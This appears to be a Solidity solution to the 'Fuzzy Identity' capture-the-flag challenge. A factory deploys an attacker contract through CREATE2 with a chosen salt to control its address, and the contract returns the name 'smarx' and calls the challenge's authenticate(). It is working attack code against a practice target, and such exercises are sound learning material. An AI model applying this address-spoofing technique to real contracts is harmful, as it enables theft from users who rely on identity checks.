pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT

import "hardhat/console.sol";

interface IFuzzyIdentityChallenge {
    function authenticate() external;
    function isComplete() external returns (bool);
}

contract FuzzyIdentityChallengeAttackerFactory {

    address public deployAddress;

    function deploy(bytes memory bytecode, bytes32 salt) public {
        address addr;
        assembly {
            addr := create2(0, add(bytecode, 32), mload(bytecode), salt)
            if iszero(extcodesize(addr)) {
                revert(0, 0)
            }
        }
        // This format also works.
        // https://docs.soliditylang.org/en/latest/control-structures.html#salted-contract-creations-create2
        // deployAddress = address(new FuzzyIdentityChallengeAttacker{salt: salt}(addr));
        deployAddress = addr;
    }
}

contract FuzzyIdentityChallengeAttacker {

    IFuzzyIdentityChallenge challenge;

    constructor(address addr) {
        challenge = IFuzzyIdentityChallenge(addr);
    }

    function attack() public {
        challenge.authenticate();
        require(challenge.isComplete(), "Challenge failed.");
    }

    function name() public pure returns (bytes32) {
        return bytes32("smarx");
    }
}
